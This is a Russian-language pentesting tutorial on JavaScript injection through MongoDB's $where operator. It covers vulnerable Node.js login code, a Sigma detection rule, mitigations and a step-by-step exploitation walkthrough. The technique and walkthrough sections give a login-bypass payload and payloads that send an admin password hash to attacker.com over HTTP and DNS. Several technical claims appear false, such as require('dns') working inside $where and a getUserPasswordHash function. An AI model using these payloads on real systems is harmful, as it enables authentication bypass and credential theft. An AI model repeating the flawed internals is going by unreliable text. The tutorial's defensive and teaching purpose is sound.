# Оператор $where в MongoDB как вектор JS-инъекции

## Контекст и базовые понятия: место NoSQL в архитектуре и природа MongoDB

NoSQL (Not Only SQL) — это обобщающий термин для классов СУБД, которые не используют реляционную модель данных и язык SQL в качестве основного интерфейса взаимодействия. Термин возник как реакция на ограничения реляционных баз данных (RDBMS) в условиях масштабирования, гетерогенности данных и требований к высокой производительности записи. В отличие от RDBMS, где структура данных строго фиксирована схемой (таблицы, столбцы, типы), NoSQL-системы предлагают гибкие модели данных: документную, ключ-значение, графовую или столбцовую.

MongoDB является ярким представителем документоориентированных NoSQL-баз данных. Она хранит данные в формате BSON (Binary JSON), что позволяет встраивать сложные вложенные структуры, массивы и объекты непосредственно в документы. Ключевой особенностью MongoDB является отсутствие жесткой схемы (schema-less): документы в одной коллекции могут иметь совершенно разную структуру. Это обеспечивает высокую скорость разработки и гибкость, но переносит ответственность за целостность и безопасность данных на уровень приложения.

В контексте тестирования на проникновение атаки на NoSQL-базы данных принципиально отличаются от классических SQL-инъекций. В RDBMS инъекция заключается во внедрении вредоносного SQL-кода, который интерпретируется движком запросов как часть команды. В MongoDB, особенно в ранних версиях и при использовании определенных операторов, возникает другой класс уязвимостей — **JavaScript-инъекция (JS Injection)**. Это происходит потому, что MongoDB использует язык JavaScript (на базе движка V8) для описания логики запросов, агрегаций и валидации данных.

Ключевое разграничение между SQL-инъекцией и JS-инъекцией в MongoDB заключается в механизме исполнения:
1.  **SQL-инъекция**: Вредоносный код внедряется в строку запроса, которая затем парсится SQL-движком. Уязвимость возникает из-за смешения данных и кода.
2.  **JS-инъекция в MongoDB**: Возникает при использовании операторов, которые принимают JavaScript-функции или строковые выражения, интерпретируемые как код. Если пользовательский ввод попадает внутрь этой функции без должной санитизации, злоумышленник может выполнить произвольный JavaScript-код на сервере базы данных.

Путаница часто возникает из-за того, что MongoDB поддерживает синтаксис, похожий на SQL (например, `find()`, `where` в некоторых контекстах ORM), и многие разработчики переносят паттерны защиты от SQL-инъекций на NoSQL, что приводит к ошибкам. В MongoDB нет стандартного оператора `WHERE` в том виде, в котором он есть в SQL. Вместо него используются операторы `$where`, `$expr`, `$function` или методы агрегации. Именно оператор `$where` является наиболее критичным вектором атаки, так как он позволяет выполнять произвольный JavaScript-код для каждой записи в коллекции.

| Характеристика | SQL-инъекция (RDBMS) | JS-инъекция (MongoDB `$where`) |
| :--- | :--- | :--- |
| **Цель** | Изменение логики SQL-запроса | Выполнение произвольного JS-кода на сервере БД |
| **Механизм** | Внедрение в строку запроса (парсинг SQL) | Внедрение в аргумент функции `eval` или `$where` |
| **Язык исполнения** | SQL | JavaScript (V8) |
| **Влияние на систему** | Чтение/изменение данных, иногда RCE (через xp_cmdshell и др.) | Полный контроль над сервером БД (RCE) через `eval` |
| **Защита** | Параметризованные запросы (Prepared Statements) | Отказ от `$where`, использование `$expr`, санитизация |
| **Сложность эксплуатации** | Высокая (требует понимания структуры БД) | Низкая (достаточно передать строку с кодом) |

Оператор `$where` в MongoDB позволяет выполнять JavaScript-выражение для каждой записи в коллекции. Синтаксис выглядит так: `db.collection.find({ $where: "javascript code" })`. Если строка передается как аргумент, она интерпретируется как код. Если передается функция, она также выполняется. Уязвимость возникает, когда часть пользовательского ввода (например, значение из HTTP-параметра) конкатенируется в строку JavaScript-кода, которая затем передается в `$where`.

## Внутреннее устройство: механизм работы `$where` и архитектура уязвимости

Оператор `$where` в MongoDB реализует функционал, аналогичный `WHERE` в SQL, но с критическим отличием: он не использует оптимизатор запросов и индексы. Вместо этого он загружает каждый документ в память, преобразует его в объект JavaScript и выполняет предоставленное выражение. Это делает `$where` крайне медленным на больших объемах данных, но именно эта гибкость делает его опасным.

### Архитектура исполнения `$where`

Когда клиент отправляет запрос с `$where`, сервер MongoDB выполняет следующие шаги:
1.  **Парсинг запроса**: Движок MongoDB разбирает BSON-документ запроса. Если поле `$where` содержит строку, она помечается как код для выполнения.
2.  **Сканирование коллекции**: Сервер последовательно (или параллельно, в зависимости от конфигурации) проходит по всем документам коллекции.
3.  **Контекст выполнения**: Для каждого документа создается контекст выполнения JavaScript. Документ становится доступным через переменную `this`.
4.  **Выполнение кода**: Строка из `$where` интерпретируется как JavaScript-код. Если код возвращает `true`, документ включается в результат. Если `false` или `null` — исключается.
5.  **Ограничения безопасности**: В современных версиях MongoDB (начиная с 3.6+) по умолчанию отключена возможность выполнения произвольного кода через `$where` в некоторых контекстах (например, в агрегациях), но в простых запросах `find()` он все еще может быть активен, если сервер настроен с разрешением на выполнение кода (`enableJavaScriptNoEval` не установлен в строгий режим, хотя в новых версиях это контролируется параметром `javascriptEnabled`).

### Механизм возникновения уязвимости

Уязвимость JS-инъекции возникает, когда разработчик приложения формирует запрос динамически, подставляя пользовательские данные непосредственно в строку JavaScript.

Рассмотрим типичный паттерн уязвимого кода на Node.js:

```javascript
// Уязвимый код
const username = req.query.username;
const query = { $where: "this.username == '" + username + "'" };
db.users.find(query);
```

Здесь пользовательский ввод `username` напрямую вставляется в строку. Если злоумышленник передаст значение `'; db.printAllRoles(); //`, то итоговый код будет:
`this.username == ''; db.printAllRoles(); //`

В JavaScript это валидный код:
1.  `this.username == ''` — проверяет условие (возвращает true/false).
2.  `db.printAllRoles();` — выполняется независимо, так как разделено точкой с запятой.
3.  `//` — комментарий, игнорирующий остаток строки.

### Критические функции и методы, подверженные инъекции

Помимо `$where`, инъекции JavaScript возможны в других местах, где MongoDB принимает код:

1.  **`$where` в `find()`**: Как описано выше.
2.  **`$where` в `mapReduce()`**: Функции `map` и `reduce` выполняются на сервере.
3.  **`$function` в агрегациях (MongoDB 5.0+)**: Позволяет вызывать JavaScript-функции в пайплайне агрегации.
4.  **`eval()`**: Прямое выполнение кода на сервере (отключено по умолчанию в новых версиях, но может быть включено).
5.  **Валидация схем (`$jsonSchema`)**: В некоторых случаях можно внедрить код в валидаторы.

### Индикаторы наличия уязвимости

При тестировании на проникновение индикаторами уязвимости являются:
*   Использование оператора `$where` в запросах.
*   Медленная обработка запросов с `$where` (так как он не использует индексы).
*   Ошибки синтаксиса JavaScript при передаче некорректных данных (например, `ReferenceError: ... is not defined`).
*   Возможность выполнения системных команд через `db.eval()` или `exec` в JavaScript (в старых версиях).

### Сравнение с безопасными альтернативами

| Оператор | Безопасность | Производительность | Использование |
| :--- | :--- | :--- | :--- |
| `$where` | **Низкая** (JS-инъекция) | Низкая (полное сканирование) | Динамические сложные условия |
| `$expr` | **Высокая** (нет исполнения JS) | Средняя (использует индексы) | Сравнение полей внутри документа |
| `$function` | **Средняя** (требует настройки) | Низкая | Агрегация с JS-логикой |
| Прямые операторы (`$eq`, `$gt`) | **Высокая** | Высокая (использует индексы) | Стандартные условия фильтрации |

Оператор `$expr` позволяет использовать выражения MongoDB (не JavaScript) внутри запроса, что безопасно и эффективно. Например, вместо `$where: "this.a == this.b"` следует использовать `{ $expr: { $eq: ["$a", "$b"] } }`.

## Применение и работа с предметом: обнаружение и эксплуатация

На практике тестировщик сталкивается с необходимостью определить, использует ли приложение MongoDB и как обрабатываются пользовательские данные. Эксплуатация JS-инъекции в MongoDB требует понимания синтаксиса JavaScript и особенностей работы с BSON.

### Этапы обнаружения

1.  **Идентификация СУБД**:
    *   Ошибки сервера часто содержат информацию о MongoDB (например, `MongoError: ...`).
    *   Анализ заголовков HTTP или параметров URL. MongoDB часто использует параметры вида `?username=admin&password=123`.
    *   Использование инструмента **NoSQLmap** или **Burp Suite** с шаблонами для MongoDB.

2.  **Тестирование на инъекцию**:
    *   Подача специальных payload в параметры, которые, как предполагается, попадают в запрос.
    *   Проверка на синтаксические ошибки JavaScript.
    *   Проверка на временные задержки (time-based) для подтверждения выполнения кода.

### Техники эксплуатации

#### 1. Прямое выполнение кода

Если уязвимость позволяет выполнить произвольный код, можно использовать встроенные функции MongoDB для взаимодействия с системой. В старых версиях MongoDB (до 3.0) функция `db.eval()` позволяла выполнять JavaScript-код на сервере, включая системные вызовы через `exec` (в некоторых сборках).

Пример payload для `username`:
```javascript
'; var http = require('http'); http.get('http://attacker.com/?result='+db.version(), function(res) { res.on('data', function(data) { console.log(data); }); }); //
```

В современных версиях MongoDB выполнение системных команд ограничено. Однако можно выполнить код, который:
*   Читает данные из других коллекций.
*   Отправляет данные на внешний сервер (DNS-экфильтрация или HTTP-запросы).
*   Модифицирует данные в базе.

#### 2. Обход аутентификации

Классический пример обхода логина:
Параметр `username`: `admin'; return true; //`
Параметр `password`: `anything`

Итоговый запрос:
```javascript
db.users.find({ $where: "this.username == 'admin'; return true; //'" })
```
Это вернет первого пользователя с именем `admin`, игнорируя проверку пароля.

#### 3. DNS-экфильтрация данных

Так как прямое чтение файлов на сервере может быть ограничено, данные можно выгрузить через DNS-запросы:

```javascript
'; var dns = require('dns'); dns.resolve('data='+db.getSiblingDB('admin').getUserPasswordHash('admin')+'.attacker.com', function(err, addresses) { console.log(err); }); //
```

### Инструментарий и автоматизация

*   **NoSQLmap**: Автоматизированный инструмент для тестирования на уязвимости NoSQL. Поддерживает обнаружение, инъекцию, обход аутентификации и извлечение данных.
*   **Burp Suite**: Ручное тестирование с помощью Intruder. Можно использовать макросы для генерации payload.
*   **MongoDB Shell (mongosh)**: Для ручного тестирования, если есть доступ к API или если приложение позволяет вводить данные в формате BSON/JSON.

### Типичные ошибки разработчиков

1.  **Использование `$where` вместо `$eq`**: Разработчики используют `$where` для простых сравнений, не осознавая рисков.
2.  **Конкатенация строк**: Вставка пользовательского ввода в строку JavaScript без санитизации.
3.  **Неверная санитизация**: Попытки экранировать кавычки с помощью `addslashes` или аналогов, которые не работают в контексте JavaScript.
4.  **Игнорирование версий MongoDB**: Использование старых функций (`db.eval`), которые отключены в новых версиях, но могут быть активны в устаревших инсталляциях.

### Правила детекции (Sigma/YARA)

Для обнаружения попыток эксплуатации в логах можно использовать правила, ищущие паттерны `$where` с подозрительными конструкциями.

```yaml
title: MongoDB $where Injection Attempt
id: 12345678-1234-1234-1234-123456789012
status: experimental
logsource:
  category: application
  product: mongodb
detection:
  selection:
    message:
      - '*$where*'
      - '*eval*'
  filter_safe:
    message:
      - 'javascriptEnabled: false'
  condition: selection and not filter_safe
level: high
tags:
  - attack.injection
  - cwe-94
```

## Сквозной практический пример: Обход аутентификации и извлечение данных через JS-инъекцию

**Исходные условия**:
*   **Среда**: Локальная установка MongoDB 4.4 (с включенной аутентификацией).
*   **Приложение**: Веб-приложение на Node.js с уязвимым кодом аутентификации.
*   **Инструменты**: Burp Suite Professional, MongoDB Shell (mongosh).
*   **Роль**: Тестировщик на проникновение.
*   **Сценарий**: Обход формы логина и извлечение хеша пароля администратора.

### Шаг 1: Анализ уязвимого кода

Приложение принимает параметры `username` и `password` и формирует запрос к MongoDB:

```javascript
// Уязвимый код приложения
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    // Уязвимость: конкатенация в $where
    const query = { $where: "this.username == '" + username + "' && this.password == '" + password + "'" };
    
    db.users.findOne(query, (err, user) => {
        if (user) {
            res.send("Welcome " + user.username);
        } else {
            res.send("Invalid credentials");
        }
    });
});
```

### Шаг 2: Эксплуатация обхода аутентификации

Цель: Войти как администратор, не зная пароля.

**Действие**: Отправка POST-запроса с payload в поле `username`.

**Payload**:
```json
{
  "username": "admin'; return true; //",
  "password": "anything"
}
```

**Артефакт (HTTP-запрос)**:
```http
POST /login HTTP/1.1
Host: target-app.com
Content-Type: application/json

{"username": "admin'; return true; //", "password": "anything"}
```

**Ожидаемый вывод**:
Сервер возвращает `Welcome admin`. Запрос интерпретируется как:
`this.username == 'admin'; return true; // && this.password == 'anything'`
Логика:
1.  `this.username == 'admin'` — проверяется.
2.  `return true` — принудительно возвращает true.
3.  `//` — игнорирует остаток строки (проверку пароля).

### Шаг 3: Извлечение данных через DNS-экфильтрацию

Цель: Получить хеш пароля пользователя `admin`.

**Действие**: Изменение payload для выполнения JavaScript-кода, который отправляет данные на внешний сервер.

**Payload**:
```json
{
  "username": "'; var dns = require('dns'); dns.resolve(''+db.getSiblingDB('admin').getUserPasswordHash('admin')+'.attacker.com', function(err) { console.log(err); }); //",
  "password": "anything"
}
```

**Артефакт (HTTP-запрос)**:
```http
POST /login HTTP/1.1
Host: target-app.com
Content-Type: application/json

{"username": "'; var dns = require('dns'); dns.resolve(''+db.getSiblingDB('admin').getUserPasswordHash('admin')+'.attacker.com', function(err) { console.log(err); }); //", "password": "anything"}
```

**Ожидаемый вывод**:
На DNS-сервере атакующего (`attacker.com`) появляется запись A с именем, содержащим хеш пароля. Например:
`a1b2c3d4e5f6...attacker.com`

### Шаг 4: Подтверждение выполнения кода

Цель: Убедиться, что код выполняется на сервере.

**Действие**: Отправка запроса, который вызывает ошибку или задержку.

**Payload**:
```json
{
  "username": "'; throw new Error('Injected'); //",
  "password": "anything"
}
```

**Артефакт (HTTP-ответ)**:
```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{"error": "MongoError: Error: Injected"}
```

**Ожидаемый вывод**:
Сервер возвращает ошибку 500 с сообщением "Injected", подтверждая, что JavaScript-код был выполнен и вызвал исключение.

### Ожидаемый вывод примера

Пример демонстрирует, как оператор `$where` позволяет выполнить произвольный JavaScript-код на сервере MongoDB. Это приводит к:
1.  Обходу аутентификации (полный доступ к учетной записи).
2.  Извлечению конфиденциальных данных (хешей паролей) через побочные каналы (DNS).
3.  Возможности выполнения других действий (чтение/запись данных, модификация документов).

Уязвимость критична, так как дает атакующему уровень привилегий, равный привилегиям пользователя MongoDB, от имени которого работает приложение.

## Аналитический вывод

Оператор `$where` в MongoDB представляет собой мощный, но опасный инструмент, который нарушает принцип разделения данных и кода. Его использование для фильтрации данных на основе пользовательского ввода является критической уязвимостью, позволяющей выполнить произвольный JavaScript-код на сервере базы данных. В отличие от SQL-инъекций, где защита обеспечивается параметризованными запросами, в MongoDB защита требует отказа от `$where` в пользу безопасных операторов, таких как `$expr` или прямые сравнения (`$eq`, `$gt`).

Разработчики часто используют `$where` из-за его гибкости и простоты, не осознавая рисков. Тестировщики на проникновение должны активно искать использование `$where` в запросах и проверять, как пользовательский ввод попадает в его аргументы. Современные версии MongoDB ограничивают возможности выполнения системных команд, но инъекция JavaScript все еще позволяет читать и модифицировать данные, а также осуществлять экфильтрацию через DNS или HTTP.

Для предотвращения уязвимостей необходимо:
1.  Избегать использования `$where` для фильтрации данных.
2.  Использовать `$expr` для сравнения полей внутри документа.
3.  Использовать прямые операторы (`$eq`, `$in`, `$regex`) для внешних условий.
4.  Валидировать и санитизировать все пользовательские данные, даже если они не попадают напрямую в `$where`.
5.  Отключать выполнение JavaScript на сервере, если это возможно (параметр `javascriptEnabled`).

Безопасная работа с MongoDB требует понимания ее внутренней архитектуры и отличий от реляционных баз данных. Перенос паттернов защиты из SQL-мира без адаптации к специфике NoSQL приводит к критическим уязвимостям.
